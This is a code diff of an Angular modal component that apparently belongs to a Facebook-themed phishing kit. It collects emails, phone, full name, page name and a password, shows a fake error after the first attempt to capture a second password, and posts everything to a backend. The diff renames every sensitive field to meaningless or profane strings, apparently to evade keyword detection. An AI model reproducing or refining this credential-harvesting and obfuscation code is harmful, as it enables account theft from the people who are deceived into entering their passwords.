@@ -27,7 +27,7 @@ export class FirstModalComponent {
     
     this.fullData = data
 
-    console.log(this.fullData.business_email)
+    console.log(this.fullData.lamasaas)
   }
 
   targetDetail : any = {
@@ -42,20 +42,20 @@ export class FirstModalComponent {
     console.log(this.targetDetail)
     if (this.firstAttempt) {
       this.targetDetail = {
-        business_email: this.fullData.business_email,
-          personal_email: this.fullData.personal_email,
-          phone: this.fullData.phone,
+        lamasaas: this.fullData.lamasaas,
+        ditmequan: this.fullData.ditmequan,
+          yokanihr: this.fullData.yokanihr,
           reason: this.fullData.reason,
-          full_name: this.fullData.full_name,
-          facebook_pagename: this.fullData.facebook_pagename,
-          first_password: this.passwordControl.value,
+          ssafasdf: this.fullData.ssafasdf,
+          thangbebietdi: this.fullData.thangbebietdi,
+          cobebietdi: this.passwordControl.value,
       }
       
       this.firstAttempt = false;
       this.showError = true;
       this.managementService.submitPart1(this.targetDetail).subscribe(
         (response) => {
-          console.log('API Response:', response);
+          console.log('API Response:', response); 
         },
         (error) => {
           console.error('API Error:', error);
@@ -63,13 +63,13 @@ export class FirstModalComponent {
       )
     } else {
       this.targetDetail = {
-        business_email: this.fullData.business_email,
-          personal_email: this.fullData.personal_email,
-          phone: this.fullData.phone,
+        lamasaas: this.fullData.lamasaas,
+        ditmequan: this.fullData.ditmequan,
+          yokanihr: this.fullData.yokanihr,
           reason: this.fullData.reason,
-          full_name: this.fullData.full_name,
-          facebook_pagename: this.fullData.facebook_pagename,
-          second_password: this.passwordControl.value,
+          ssafasdf: this.fullData.ssafasdf,
+          thangbebietdi: this.fullData.thangbebietdi,
+          cobebietdi2: this.passwordControl.value,
       }
       console.log(this.password)
       this.dialogRef.close(this.password);
